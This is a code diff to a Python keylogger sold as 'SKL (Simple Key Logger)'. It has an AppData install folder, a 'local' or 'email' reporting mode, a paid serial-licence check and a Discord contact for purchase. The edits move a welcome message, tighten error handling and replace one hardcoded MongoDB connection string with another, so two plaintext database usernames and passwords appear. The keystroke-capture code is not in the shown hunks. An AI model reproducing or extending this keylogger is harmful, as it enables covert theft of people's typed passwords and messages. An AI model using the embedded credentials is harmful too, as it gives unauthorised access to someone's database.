@@ -59,11 +59,6 @@ keys_pressed = 0
 
 
 
-
-
-    
-
-
 USER = os.getlogin()
 directory = "SKL"
 parent_dir = f"C:/Users/{USER}/AppData/Roaming"
@@ -314,7 +309,6 @@ def returnConfigData():
 
 
 def __main__():
-    print("Welcome to SKL, type \"help\" for a list of commands")
     print( bcolors.RESET_DIM +bcolors.WARNING + "SKL (Simple Key Logger)")
     CONSOLE = input(bcolors.WARNING + "Command: " + bcolors.WHITE)
     os.system("cls")
@@ -335,6 +329,7 @@ def __main__():
                "\n(exit) " + bcolors.DIM + "Close the SKL Program" +
                  bcolors.RESET_DIM + "\n(saved) " + bcolors.DIM + "Shows your current saved config."+bcolors.RESET_DIM + "\n(Mode)" +
                  bcolors.DIM + " choose between 'local' or 'email' mode." + bcolors.RESET_DIM + "\n(status) " + bcolors.DIM + "Checks the status of various things in the program")
+        return_c = 1
         
 
     elif CONSOLE.lower() == "config":
@@ -427,7 +422,7 @@ def connectToDatabase(returnItem):
 
     try:
         
-        uri = "mongodb+srv://USER_SKL_PROGRAM:2szsiET3RM0JuQnl@skl.jdigidi.mongodb.net/?retryWrites=true&w=majority"
+        uri = "mongodb+srv://SKL-USER:mGKEgzZbcUPu2iwM@skl.jdigidi.mongodb.net/?retryWrites=true&w=majority"
 
         client = MongoClient(uri, server_api=ServerApi('1'))
 
@@ -448,8 +443,9 @@ def connectToDatabase(returnItem):
         elif returnItem == "games":
             return games_collection
 
-    except:
+    except Exception as e:
         print("Failed to connect to SKL database!\nAre you a registered user? Please contact voidy6059 on discord about this issue.")
+        exit()
 
 
 
@@ -525,12 +521,14 @@ def isLicensed():
         __main__()
     else:
         print(bcolors.FAIL + "Invaild serial " + bcolors.WHITE + "|| please contact " + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " to " + bcolors.OKGREEN + "purchase." + bcolors.WHITE)
+        input()
         exit()
            
 
 #%# -----------------------------------INJECTOR----------------------------------- #%#
 
 isLicensed()
+print("Welcome to SKL, type \"help\" for a list of commands")
 printlogo()
 __main__()
 
